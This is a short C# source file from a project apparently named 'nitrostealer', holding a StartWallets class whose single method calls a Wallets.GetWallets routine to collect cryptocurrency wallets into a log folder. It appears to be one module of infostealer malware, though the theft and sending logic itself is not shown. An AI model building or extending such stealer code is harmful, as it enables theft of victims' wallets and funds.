﻿using System;
using System.Threading;

namespace nitrostealer
{
    class StartWallets
    {
        public static void Start()
        {
            string WorkDir = Help.LogPath;

            try
            {
                Wallets.GetWallets(WorkDir);
            }
            catch(Exception e)
            {
                Console.WriteLine(e + "Oh, some errors..." );
            }
        }
    }
}
